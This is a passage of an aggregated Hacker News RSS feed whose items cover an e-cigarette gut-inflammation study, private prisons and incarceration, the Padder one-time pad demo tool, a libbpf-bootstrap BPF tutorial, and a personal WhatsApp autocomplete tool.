href="https://t.umblr.com/redirect?z=https%3A%2F%2Fucsdnews.ucsd.edu%2Fpressrelease%2Fstudy-e-cigarettes-trigger-inflammation-in-the-gut&amp;t=NmIyMDZkZTFjM2QzNGI1Mzc0NWFjYzY0NTk3YjIxOGU2YTY5ZDEzMCwyeTAyd2poeQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F639780077299695616%2Fe-cigarettes-gut-inflammation&amp;m=0&amp;ts=1610341358">HUMANOID Center of Research Excellence</a>.</i></p><p>They noted that epithelial tight conjunction markers, which are zipper-like proteins that form the gut’s first physical barrier, began to break or loosen, causing pathogens from the vapor to seep into the surrounding immune system, wreaking havoc on protective epithelial cells that lie just beneath. </p><p>Such cells act as a defense against infection by clearing pathogenic microbes and initiating certain immune responses in the body. When exposed to the e-cigarette liquid, the cells were quickly overwhelmed, unable to effectively clear pathogens, resulting in gut inflammation. </p><p>The study is part of the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmedschool.ucsd.edu%2Fresearch%2Finm%2Fhumanoid%2FPages%2Fdefault.aspx&amp;t=Y2IwY2MxZDg4MWNkMWFkNDBmZDllNTUwYjI5ZGZhZTJlNTdjY2IzNCwyeTAyd2poeQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F639780077299695616%2Fe-cigarettes-gut-inflammation&amp;m=0&amp;ts=1610341358">HUMANOID Center of Research Excellence</a>, a core facility based at UC San Diego School of Medicine led by Ghosh and Das who was senior author of the study. Scientists at the center use a variety of human organoids and other tools to model diseases and effects.</p><p>“This is the first study that demonstrates how chronic exposure to e-cigarettes increases the gut’s susceptibility to bacterial infections, leading to chronic inflammation and other health concerns,” said Das. “Given the importance of the gut barrier in the maintenance of the body’s immune homeostasis, the findings provide valuable insight into the potential long-term harmful effects chronic use of e-cigarettes on our health.” </p><p>Ghosh said damage to the gut lining may be reversible over time if the inciting factor, in this case e-cigarette use, is eliminated, but the effects of chronic inflammation upon other organs, such as the heart or brain, may be irreversible. In the future, Ghosh said she and colleagues plan to look at different flavorings of e-cigarettes to determine what effects they might have on the gut. </p><p>Additional study co-authors include: Aditi Sharma, Jasper Lee, Ayden G. Fonseca, Alex Moshensky, Taha Kothari, Ibrahim M. Sayed, Stella-Rita Ibeawuchi, Rama F. Pranadinata, Jason Ear, and Debashis Sahoo, all at UC San Diego. </p><p>This research was funded, in part, by the National Institutes of Health (DK107585, AI141630, and HL147326) and the University of California Office of the President — Tobacco-Related Disease Research Program (28IP-0024, 30IP-0965 and 26IP-0040).</p><p>–</p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fucsdnews.ucsd.edu%2Fpressrelease%2Fstudy-e-cigarettes-trigger-inflammation-in-the-gut&amp;t=NmIyMDZkZTFjM2QzNGI1Mzc0NWFjYzY0NTk3YjIxOGU2YTY5ZDEzMCwyeTAyd2poeQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F639780077299695616%2Fe-cigarettes-gut-inflammation&amp;m=0&amp;ts=1610341358">University of California San Diego (UC San Diego)</a></b></p><p><b>Full research:</b>&nbsp;“E-cigarettes compromise the gut barrier and trigger inflammation”, <i>iScience</i>.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdoi.org%2F10.1016%2Fj.isci.2021.102035&amp;t=ZTU0YTljNzdhYWZiN2FmYzNjYzM1Y2E3YWI0NzAxNDU0ZmJiYWEwOSwyeTAyd2poeQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F639780077299695616%2Fe-cigarettes-gut-inflammation&amp;m=0&amp;ts=1610341358">https://doi.org/10.1016/j.isci.2021.102035</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/635162930879594496/smoking-and-covid19">Study: How smoking worsens COVID-19 infection in the airways</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/smoking">smoking</a>
                                    
                                        <a href="https://nuadox.com/tagged/toxicology">toxicology</a>
                                    
                                        <a href="https://nuadox.com/tagged/ecigarettes">ecigarettes</a>
                                    
                                        <a href="https://nuadox.com/tagged/vaping">vaping</a>
                                    
                                        <a href="https://nuadox.com/tagged/medicine">medicine</a>
                                    
                                        <a href="https://nuadox.com/tagged/health">health</a>
                                    
                                        <a href="https://nuadox.com/tagged/gut">gut</a>
                                    
                                    </p>
                                </span></p>
                                
                            </div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/639780077299695616/e-cigarettes-gut-inflammation</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690888</guid>
            <pubDate>Fri, 08 Jan 2021 21:42:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[States with private prisons put more people in prison for longer]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25690796">thread link</a>) | @mike_h
<br/>
January 8, 2021 | https://academictimes.com/states-with-private-prisons-put-more-people-in-prison-for-longer/ | <a href="https://web.archive.org/web/*/https://academictimes.com/states-with-private-prisons-put-more-people-in-prison-for-longer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="articleBody"><p dir="ltr">U.S. states that rely on private prisons incarcerate more people for longer periods of time, according to a first-of-its-kind study that establishes a causal connection between private prisons and incarceration.Â&nbsp;</p><p dir="ltr">The <a href="https://www.sciencedirect.com/science/article/abs/pii/S0927537120301123">paper</a>, published in the December issue of <em>Labour Economics</em>, adds to researchersâ€™ understanding of financial incentives in the criminal justice system, according to authors Gregmar Galinato and Ryne Rohla, both economists at Washington State University.</p><p dir="ltr">The researchers found that states that opened private prisons saw a 4% jump in prison population, or an average of between 6 and 37 extra prisoners per million residents, based on a review of data from 1989 to 2008. Incarcerating those extra people cost states an extra $1.9 million to $10.6 million per year if all additional prisoners were housed in private prisons.</p><p dir="ltr">Galinato and Rohla found that the growth in prison population experienced by states with private prisons was caused by an increase in the number of people being sent to prison, as well as judges handing down longer sentences for particular crimes.Â&nbsp;</p><p dir="ltr">Specifically, a 1% increase in private prison beds per capita will increase sentencing lengths for regulatory offenses by 29 days, weapons offenses by 13 days, drug offenses by 7 days and fraud offenses by 2 days, the researchers found.Â&nbsp;</p><p dir="ltr">However, those figures might underestimate the actual amount of time incarcerated people spend in private prisons, the researchers added, pointing to a 2019 <a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=2523238">paper</a> by Wisconsin School of Business professor Anita Mukherjee that found that private prison inmates in Mississippi served a full three months longer than people convicted of the same crimes who were sent to public prisons. Mukherjee attributed the lengthier time served to the fact that conduct violations, which can tack extra time onto prisonersâ€™ sentences, are more common in private prisons than in public ones.Â&nbsp;</p><p dir="ltr">While Galinato and Rohla found that people convicted of weapons and drug offenses saw harsher sentences in states with more private prison beds, sentencing for other crimes such as murder did not change.Â&nbsp;</p><p dir="ltr">â€œThat was a good marker for us, because that showed that this wasnâ€™t random noise going on or some correlation,â€� said Galinato of the fact that only some crimes saw a sentencing difference.Â&nbsp;</p><p dir="ltr">In order to establish a causal relationship, the researchers created an instrument called â€œprivatization knowledgeâ€� that indicated academic support for privatization by state from 1989 to 2008. That instrument, which was partially based on the use of words like â€œneoliberalismâ€� in academic journals, corresponded only to the proliferation of private prisons -- not the incarceration rate, the researchers said. Â&nbsp;</p><p dir="ltr">Galinato said that finding an instrument to establish causality was one of the most difficult parts of the project, as the connection between private prisons and incarceration can be self-perpetuating. Developing and using the â€œprivatization knowledgeâ€� instrument took years.Â&nbsp;</p><p dir="ltr">Galinato came up with the idea in 2015, and Rohla began compiling data shortly thereafter. It took about one year to get permission to use Department of Justice data, he said.Â&nbsp;</p><p dir="ltr">In addition to establishing a causal relationship between private prisons and incarceration, Galinato and Rohla also examined two factors that could lead authorities to hand down more and harsher sentences in the first place.Â&nbsp;</p><p dir="ltr">Political corruption could lead politicians to enact stricter laws and cause judges to hand down harsher sentences, the researchers said, pointing to the 2008 â€œkids for cashâ€� <a href="https://nypost.com/2014/02/23/film-details-teens-struggles-in-state-detention-in-payoff-scandal/">scandal</a> in which Pennsylvania judges received kickbacks in exchange for giving juvenile offenders harsher prison sentences.Â&nbsp;</p><p dir="ltr">Judges may also consider prison capacity when sentencing people, Galinato added. â€œIf you have a crowded public system, the judge will say, â€˜OK, this is a marginal person, weâ€™ll probably put them on probation because we donâ€™t want to overcrowd the prison.â€™â€�Â&nbsp;</p><p dir="ltr">However, the researchers did not find a strong enough link to claim that either factor has definitively led to higher incarceration rates at private prisons.Â&nbsp;</p><p dir="ltr">â€œThe best we can say is thereâ€™s a hint,â€� said Galinato. â€œThere could be more mechanisms [affecting incarceration rates] out there.â€�Â&nbsp;</p><p dir="ltr">Rebecca Riddell, the co-director of New York University Law Schoolâ€™s Human Rights and Privatization Project, <a href="https://twitter.com/Rebecca_Riddell/status/1305884832153718785">praised</a> the study on Twitter.</p><p dir="ltr">â€œIt's appalling that private prisons increase incarceration levels,â€� said Riddell. â€œBut should we be surprised? Or is this a foreseeable outcome of creating a powerful industry that profits from every [additional] incarcerated person, takes in billions in taxpayer [dollars] and spends millions lobbying?â€�Â&nbsp;</p><p dir="ltr">Galinato told <em>The Academic TimesÂ&nbsp;</em>that the link between private prisons and incarceration must factor into government policy.Â&nbsp;</p><p dir="ltr">â€œThere is this potential link, and this link becomes more significant if thereâ€™s more corruption and you donâ€™t have oversight,â€� he said, adding that policymakers donâ€™t typically consider that choosing private prisons over public ones increases overall incarceration.Â&nbsp;</p><p dir="ltr">Galinato, who typically works as a natural resource and development economist, said he was inspired to conduct the study when watching an episode of the television show â€œElementary,â€� in which a prison warden murders an inmate in order to appease the owner of a private prison who wants to influence a lobby group.Â&nbsp;</p><p dir="ltr">The idea of private prison companies influencing governments to set harsher sentences initially â€œmade me laugh a little bit in terms of how ludicrous it was,â€� Galinato said.Â&nbsp;</p><p dir="ltr">â€œI wasnâ€™t really aware of private prisons in the U.S.,â€� he added. â€œI come from the Philippines. We don't have them.â€�Â&nbsp;</p><p dir="ltr">His experience studying corruption in relation to natural resources came in handy when examining the criminal justice system, he added.</p><p dir="ltr">In terms of further research, Galinato said he was interested in examining the relationship between private prisons and private halfway houses, which are often owned by the same companies. The owners of halfway houses can set house rules that, if violated, send residents back to prison. That could incentivize halfway houses to set overly harsh rules in order to make more money.Â&nbsp;</p><p dir="ltr">Galinato is also interested in examining private prisonsâ€™ incentive structures, which currently involve significant moral hazard. Private prisons are paid based on how many prisoners they house on a given day, potentially leading them to push for unjustly harsh punishments.Â&nbsp;</p><p dir="ltr">â€œThat kind of contract incentivizes more prisoners and increases the length of stay,â€� said Galinato. â€œWhat if the payment would be based on when they came out of jail and became a better member of society, then the private prison would get a bonus?â€�</p><p dir="ltr"><em>The paper, titled â€œDo privately-owned prisons increase incarceration rates?â€� was first published in the December issue of Labour Economics.Â&nbsp;</em><em>The authors were Gregmar Galinato of Washington State University and Ryne Rohla, who earned a PhD from Washington State University and now works for the Washington State Attorney General's Office. Galinato was lead author.Â&nbsp;</em></p></div></div></div>]]>
            </description>
            <link>https://academictimes.com/states-with-private-prisons-put-more-people-in-prison-for-longer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690796</guid>
            <pubDate>Fri, 08 Jan 2021 21:32:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Decrypt the same ciphertext to different plaintexts]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25690564">thread link</a>) | @_wldu
<br/>
January 8, 2021 | https://www.go350.com/posts/padder-a-one-time-pad-implementation/#decrypt-the-same-ciphertext-to-multiple-plaintexts | <a href="https://web.archive.org/web/*/https://www.go350.com/posts/padder-a-one-time-pad-implementation/#decrypt-the-same-ciphertext-to-multiple-plaintexts">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://github.com/62726164/padder">Padder</a> can encrypt and decrypt small messages using <a href="https://en.wikipedia.org/wiki/One-time_pad">one-time pads</a>. It can also generate fake pads so that one encrypted message can be decrypted to multiple, different plaintexts.</p><h2 id="warning">Warning</h2><p>Padder should not be used in real-world situations that require encryption. It’s only intended for demonstration and experimentation. If you need strong message encryption, do not use padder. Use a well-regarded, open-source OpenPGP implementation such as <a href="https://gnupg.org/">GnuPG</a>.</p><h2 id="the-padder-character-set">The padder character set</h2><div><pre><code data-lang="bash">abcdefghijklmnopqrstuvwxyz0123456789-
</code></pre></div><h2 id="encrypt-a-message">Encrypt a message</h2><div><pre><code data-lang="bash">$ padder -e -m black -p e7vwd
CipherText: fhvyn
</code></pre></div><h2 id="decrypt-a-message">Decrypt a message</h2><div><pre><code data-lang="bash">$ padder -d -m fhvyn -p e7vwd
PlainText: black
</code></pre></div><h2 id="fake-message-and-pad-generation">Fake message and pad generation</h2><div><pre><code data-lang="bash">$ padder -f -m white -c fhvyn
FakePad: uanfj
</code></pre></div><h2 id="message-transmission">Message transmission</h2><p>The padder character set was selected specifically for message transmission over radio (HF, VHF, UHF). However, messages can be transmitted in other ways. Twitter, text messages, phone calls and website forums could all be used to send and receive messages. Encrypted messages could also be embedded in image tags, HTML, or some other inconspicuous place.</p><h2 id="decrypt-the-same-ciphertext-to-multiple-plaintexts">Decrypt the same ciphertext to multiple plaintexts</h2><p>The same one-time pad ciphertext can be decrypted to different plaintext messages by using different pads. This feature is useful for creating diversions. It may also provide for plausible deniability. This requires two (or more) sets of pads.</p><div><pre><code data-lang="bash">$ padder -d -m c2wrbumxvj8gob34mxn46pxg29a6kxnwfhcaam3en-hr-2v -p ryxrvqnlhz04icqq6eg56cuhg10vlx5dff3ba44wg6ic-kd
PlainText: we-are-moving-north-and-will-attack-at-the-pass

$ padder -d -m c2wrbumxvj8gob34mxn46pxg29a6kxnwfhcaam3en-hr-2v -p zifs6d9dgk36k94m9d5x77jhj277ip59gw9btmv4j7in-kc
PlainText: our-group-fled-south-to-the-city-we-sailed-east
</code></pre></div><h2 id="security-considerations-and-precautions">Security considerations and precautions</h2><p>Pads must be random, kept secret, only used once and destroyed immediately after use. Should the same pad be used to encrypt more than one message, those messages will be cracked. Should the pads become lost or stolen, then all the messages should be suspect.</p><p>You must assume that your opponent intercepts and stores all of your ciphertext messages indefinitely. They hope to somehow obtain the pads and decrypt the messages someday.</p><p>When used with appropriate procedures and precautions, one-time pad encrypted messages cannot be cracked. However, how the ciphertext message is sent and received may identify the communicating parties. This may or may not be an acceptable risk in your environment. For example, if a person posted a padder encrypted message to a Twitter account, the IP address, user name and date/time would be logged and stored. And, any IP address that read the message would be logged and stored too. Basically, any transmission method that uses a network (cellular, IP, etc.) may quickly reveal the location of the communicating parties.</p><p>Radio signals are directional and can be tracked. However, radio signals don’t rely on network infrastructure and require more expensive equipment and greater technical knowledge to track. With radio you only know the general time and direction from which the signal emanated. Also, it’s relatively easy to hide the source of radio signals when the transmitter is moving around in densely populated areas. The reception of radio signals cannot be tracked. Stations in range of the signal may relay the messages to stations out of range.</p><h2 id="notes">Notes</h2><ul><li><p>Plaintext messages, pads and ciphertext messages must only contain characters from the Padder Character Set. Capitalization, punctuation and spaces are not allowed. When creating plaintext messages, use the dash symbol ‘-’ rather than spaces to separate words. <strong>this-is-an-example-plaintext-message</strong></p></li><li><p>The pad must be as long or longer than the message. The sender and receiver should have the same numbered list of pads and know in which order to use them. There could be 31 pads for the month of January. The January 1st message would use pad number 1 for that day’s message.</p></li><li><p>One-time pad encrypted messages are not authenticated.</p></li><li><p>Padder is only intended for educational purposes and experimentation.</p></li></ul><ul><li><a href="https://www.go350.com/tags/encryption">encryption</a></li></ul></div></div>]]>
            </description>
            <link>https://www.go350.com/posts/padder-a-one-time-pad-implementation/#decrypt-the-same-ciphertext-to-multiple-plaintexts</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690564</guid>
            <pubDate>Fri, 08 Jan 2021 21:10:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[LemonIt the Hacker News of YouTube]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25690466">thread link</a>) | @CrazyCoder94
<br/>
January 8, 2021 | https://lemonit.online/blog.html | <a href="https://web.archive.org/web/*/https://lemonit.online/blog.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://lemonit.online/blog.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690466</guid>
            <pubDate>Fri, 08 Jan 2021 21:02:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building BPF applications with libbpf-boostrap]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25690449">thread link</a>) | @based2
<br/>
January 8, 2021 | https://nakryiko.com/posts/libbpf-bootstrap/ | <a href="https://web.archive.org/web/*/https://nakryiko.com/posts/libbpf-bootstrap/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						<p>Get started with your own BPF application quickly and painlessly with
<a href="https://github.com/libbpf/libbpf-bootstrap">libbpf-bootstrap</a> scaffolding,
which takes care of all the mundane setup steps and lets you dive right into
BPF fun and minimize the necessary boilerplate. We'll take a look at what
libbpf-bootstrap provides and how everything is tied together.</p>

<p>BPF is an amazing kernel technology, which allows anyone to take a pick
under the cover of how kernel functions without intense kernel development
experience and without spending tons of time to set things up for the kernel
development. BPF also eliminates the risk of crashing your OS while doing that.
Once you get up to speed with BPF, it's lots of fun and power in your hands.</p>
<p>But getting started with BPF can still be intimidating in a large part because
setting up a build workflow for even a simple "Hello, World"-like BPF
application requires a bunch of steps that could be frustrating and
intimidating for the new BPF developer. It's not really all that complicated,
but knowing the necessary steps is an (unnecessarily) hard part which probably
demotivates a lot of people from even trying, despite all the interest in and
promise of BPF.</p>
<p><a href="https://github.com/libbpf/libbpf-bootstrap">libbpf-bootstrap</a> is
a scaffolding playground setting up as much things as possible for beginner
users to let them dive straight into writing BPF programs and tinkering with
them without unnecessary frustrations of initial setup. It takes into account
best practices developed in BPF community over last few years and provides
a modern and convenient workflow with, arguably, best BPF user experience to
date. libbpf-bootstrap is relying on <a href="https://github.com/libbpf/libbpf">libbpf</a>
and uses a simple Makefile. For users needed more advanced set ups, it should
be a good starting point. At the very least, if Makefile can't be used
directly, it's simple enough to just transfer the logic to whichever build
system needs to be used.</p>
<p>libbpf-bootstrap currently has two demo BPF applications available: <code>minimal</code>
and <code>bootstrap</code>. <code>minimal</code> is exactly that – the most minimal BPF application
that compiles, loads, and runs a simple BPF equivalent of <code>printf("Hello, World!")</code>. Being the most minimal one, it also doesn't impose many
requirements on Linux kernel recentness and should run fine on quite old
kernel versions.</p>
<p><code>minimal</code> is great for quick experimentation and trying things out locally,
but it's not set up to reflect the setup of a production-intended BPF-based
application deployable across a variety of kernels. <code>bootstrap</code> is such an
example. <code>bootstrap</code> demo shows off a real-world approach to building out
minimal, but fully functional and <a href="https://nakryiko.com/posts/bpf-portability-and-co-re/">portable</a>
BPF application. To that end, it does rely on <a href="https://nakryiko.com/posts/bpf-portability-and-co-re/">BPF CO-RE</a>
and kernel <a href="https://nakryiko.com/posts/btf-dedup/">BTF</a> support, so make sure that your Linux
kernel is built with <code>CONFIG_DEBUG_INFO_BTF=y</code> Kconfig. See <a href="https://github.com/libbpf/libbpf#bpf-co-re-compile-once--run-everywhere">libbpf
README</a>
for the list of Linux distributions that have everything already setup for you.
If you'd like to minimize the hassle of building custom kernel, just stick
with the recent enough versions of any of the major Linux distros.</p>
<p>Additionally, <code>bootstrap</code> demonstrates BPF global variables usage (Linux 5.5+)
and <a href="https://nakryiko.com/posts/bpf-ringbuf">BPF ring buffer</a> use (Linux 5.8+). Neither of those
features are mandatory to build useful BPF application, but they bring huge
usability improvements and are the way that modern BPF application are built,
so I've added example of using them into a basic <code>boostrap</code> example.</p>

<p>BPF is a very dynamic technology that is constantly being developed and
evolved. This means that new features and capabilities are added all the time,
so depending on which of them you need, you might need newer kernel versions.
But BPF community takes backwards compatibility extremely seriously, which
means that old Linux kernels will still run BPF applications just fine,
provided you don't need the very latest feature sets. So the simpler and more
conservative your BPF application logic and feature set is, the higher the
chances are that you'll be able to run your BPF application on old kernels.</p>
<p>Having said that, BPF user experience gets better all the time and BPF in more
recent kernel versions provide profound improvements in BPF usability, so if
you are just getting started and don't have a strict requirements to support
outdated Linux kernel versions, make your life less painful and use the latest
kernel version you can get your hands on.</p>
<p>BPF program code is normally written in the C language with some code
organization conventions added to let <a href="https://github.com/libbpf/libbpf">libbpf</a>
make sense of BPF code structure and load properly hand everything into the
kernel. <a href="https://clang.llvm.org/">Clang</a> is the compiler used for BPF code
compilation and it's generally recommended to use the latest Clang you can.
Still, Clang 10 or newer should work fine for most BPF features, but some more
advanced <a href="https://nakryiko.com/posts/bpf-portability-and-co-re/">BPF CO-RE</a> features might require
Clang 11 or even 12 (e.g., for some of the more recent and  advanced CO-RE
relocation built-ins).</p>
<p>libbpf-bootstrap bundles with it libbpf (as a Git submodule) and bpftool (for
x86-64 architecture only) to avoid dependency on any specific (and potentially
outdated) versions available in your Linux distribution. Your system should
also have <code>zlib</code> (<code>libz-dev</code> or <code>zlib-devel</code> package) and <code>libelf</code>
(<code>libelf-dev</code> or <code>elfutils-libelf-devel</code> package) installed. Those are
dependencies of <code>libbpf</code> necessary to compile and run it properly.</p>
<p>This is not a primer on BPF technology itself, so some familiarity with basic
concepts like BPF program, BPF map, BPF hooks (attach points) are assumed. If
you need a refresher on BPF fundamentals, <a href="https://docs.cilium.io/en/latest/bpf/">these</a>
<a href="https://qmonnet.github.io/whirl-offload/2016/09/01/dive-into-bpf/">resources</a>
should be a good starting point.</p>
<p>In the rest of this post I'll walk you through the structure of
<a href="https://github.com/libbpf/libbpf-bootstrap">libbpf-bootstrap</a>, its Makefile
and both <code>minimal</code> and <code>bootstrap</code> examples. We'll look at libbpf conventions
and structuring BPF C code for use with libbpf as a BPF program loader, as well
as how to interact with your BPF programs from the user-space using libbpf
APIs.</p>

<p>Here's the contents of the <a href="https://github.com/libbpf/libbpf-bootstrap"><code>libbpf-bootstrap</code></a>
repository:</p>
<pre><code><span>$ tree
.
├── libbpf
│   ├── ...
│   ... 
├── LICENSE
├── README.md
├── src
│   ├── bootstrap.bpf.c
│   ├── bootstrap.c
│   ├── bootstrap.h
│   ├── Makefile
│   ├── minimal.bpf.c
│   ├── minimal.c
│   ├── vmlinux_508.h
│   └── vmlinux.h -&gt; vmlinux_508.h
└── tools
    ├── bpftool
    └── gen_vmlinux_h.sh

16 directories, 85 files
</span></code></pre>
<p><code>libbpf-bootstrap</code> bundles libbpf as a submodule in <code>libbpf/</code> sub-directory to
avoid depending on system-wide libbpf availability and version.</p>
<p><code>tools/</code> contains <code>bpftool</code> binary, which is used to build <a href="https://nakryiko.com/posts/bcc-to-libbpf-howto-guide/#bpf-skeleton-and-bpf-app-lifecycle">BPF
skeletons</a>
of your BPF code. Similarly to libbpf, it's bundled to avoid depending on
system-wide bpftool availability and its version being sufficiently
up-to-date.</p>
<p>Additionally, bpftool can be used to generate your own <code>vmlinux.h</code> header
with all the Linux kernel type definitions. Chances are you won't need to do
that because libbpf-bootstrap already provides pre-generated
<a href="https://raw.githubusercontent.com/libbpf/libbpf-bootstrap/master/src/vmlinux_508.h">vmlinux.h</a>
in <code>src/</code> sub-directory. It is based on default kernel config for Linux 5.8
with a bunch of extra BPF-related functionality enabled. This means it should
have lots of commonly needed kernel types and constants already. Due to <a href="https://nakryiko.com/posts/bpf-portability-and-co-re/">BPF
CO-RE</a>, <code>vmlinux.h</code> doesn't have to match
your kernel configuration and version exactly. But if nevertheless you do need to
generate your custom <code>vmlinux.h</code>, feel free to check
<a href="https://github.com/libbpf/libbpf-bootstrap/blob/master/tools/gen_vmlinux_h.sh"><code>tools/gen_vmlinux_h.sh</code></a>
script to see how it can be done.</p>
<p>Beyond self-explanatory <code>LICENSE</code> and <code>README.md</code> the rest of <code>libbpf-bootstrap</code>
is contained in a <code>src/</code> sub-directory.</p>
<p><a href="https://github.com/libbpf/libbpf-bootstrap/blob/master/src/Makefile">Makefile</a>
defines the necessary build rules to compile all the supplied (and your
custom ones) BPF apps. It follows a simple file naming convention:</p>
<ul>
<li><code>&lt;app&gt;.bpf.c</code> files are the BPF C code that contain the logic which is to
be executed in the kernel context;</li>
<li><code>&lt;app&gt;.c</code> is the user-space C code, which loads BPF code and interacts with
it throughout the lifetime of the application;</li>
<li><em>optional</em> <code>&lt;app&gt;.h</code> is a header file with the common type definitions and
is shared by both BPF and user-space code of the application.</li>
</ul>
<p>So, <code>minimal.c</code> and <code>minimal.bpf.c</code> form the <code>minimal</code> BPF demo app. And
<code>bootstrap.c</code>, <code>bootstrap.bpf.c</code>, and <code>bootstrap.h</code> are the <code>bootstrap</code> BPF
app. Simple.</p>

<p><code>minimal</code> is a good example to start with. Consider it a minimalistic
playground for trying BPF things out. It doesn't use BPF CO-RE, so you can use
older kernels and just include your system kernel headers for kernel type
definitions. It's not the best approach for building production-ready
applications and tools, but is good enough for local experimentation.</p>
<h2 id="the-bpf-side">The BPF side</h2>
<p>Here's the BPF-side code 
(<a href="https://github.com/libbpf/libbpf-bootstrap/blob/master/src/minimal.bpf.c">minimal.bpf.c</a>)
<em>in its entirety</em>:</p>
<pre><code><span>// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause
/* Copyright (c) 2020 Facebook */
</span><span>#include </span><span>&lt;linux/bpf.h&gt;
</span><span>#include </span><span>&lt;bpf/bpf_helpers.h&gt;

</span><span>char</span><span> LICENSE[] </span><span>SEC(</span><span>"license"</span><span>) </span><span>= </span><span>"Dual BSD/GPL"</span><span>;

</span><span>int</span><span> my_pid </span><span>= </span><span>0</span><span>;

</span><span>SEC</span><span>(</span><span>"tp/syscalls/sys_enter_write"</span><span>)
</span><span>int </span><span>handle_tp</span><span>(</span><span>void </span><span>*</span><span>ctx</span><span>)
{
	</span><span>int</span><span> pid </span><span>= </span><span>bpf_get_current_pid_tgid() </span><span>&gt;&gt; </span><span>32</span><span>;

	</span><span>if </span><span>(pid </span><span>!=</span><span> my_pid)
		</span><span>return </span><span>0</span><span>;

	</span><span>bpf_printk(</span><span>"BPF triggered from PID </span><span>%d</span><span>.\n"</span><span>, pid)</span><span>;

	</span><span>return </span><span>0</span><span>;
}
</span></code></pre>
<p><code>#include &lt;linux/bpf.h&gt;</code> includes some basic BPF-related types and constants
necessary for using the kernel-side BPF APIs (e.g., BPF helper function
flags). This header is needed for the <code>bpf_helpers.h</code> header, included next.
<code>bpf_helpers.h</code> is provided by <code>libbpf</code> and contains most-often used macros,
constants, and BPF helper definitions, which are used by virtually every
existing BPF application. <code>bpf_get_current_pid_tgid()</code> above is an example of
such BPF helper.</p>
<p><code>LICENSE</code> variable defines the license of your BPF code. Specifying the
license is mandatory and is enforced by the kernel. Some BPF functionality is
unavailable to non-GPL-compatible code. Note the special <code>SEC("license")</code>
annotation. <code>SEC()</code> (provided by <code>bpf_helpers.h</code>) puts variables and functions
into the specified sections. <code>SEC("license")</code>, along some other section names,
is the convention dictated by <code>libbpf</code>, so make sure you stick to it.</p>
<p>Next, we see the use of an exciting BPF feature: global variables. <code>int my_pid = 0;</code> does exactly what you'd expect: it defines a global variable which BPF
code can read and update just like any user-space C code would do …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nakryiko.com/posts/libbpf-bootstrap/">https://nakryiko.com/posts/libbpf-bootstrap/</a></em></p>]]>
            </description>
            <link>https://nakryiko.com/posts/libbpf-bootstrap/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690449</guid>
            <pubDate>Fri, 08 Jan 2021 21:01:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You: A personal auto-complete tool for WhatsApp web (and eventually everything)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25690316">thread link</a>) | @nuwandavek
<br/>
January 8, 2021 | https://vivekaithal.co/posts/you-complete-you/ | <a href="https://web.archive.org/web/*/https://vivekaithal.co/posts/you-complete-you/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      <p>GitHub Repo : <a href="https://github.com/nuwandavek/you">https://github.com/nuwandavek/you</a></p>
<p><em>You</em> is an auto-completion tool that completes your sentences. It lets you train a generative model that can mimic your personal style over all your text communication. Currently, You trains on WhatsApp chat history, and offers autocomplete suggestions on WhatsApp Web via a Chrome/Firefox extension and a flask server. This can be extended to train and autocomplete on more personal communication apps (Messenger, email, Slack, Twitter, etc.). Everything runs locally and is completely private.</p>
<h2 id="why">Why?</h2>
<p>Most text-based applications we use have some or the other form of aid to help us spell-check words, complete words or even complete sentences. Most primitive ones are based on simply looking up your words against a corpus, determining the most probable word and helping you complete them (spell-checks, Word docs). Intermediate tools use your own data to predict the most frequent bi-gram pairs (mobile keyboards), and advanced tools use neural networks (GMail, Google Docs). Predicting the next word (or token), however, is the most popular way of training a language model model using neural networks. The last couple of years has seen remarkable innovation in the field of NLP using neural networks from Bi-LSTMs to BERT to GPT3. We think the algorithms are already in place for tools to leverage their power and offer delightful personalized predictions - complete all your sentences. :)</p>
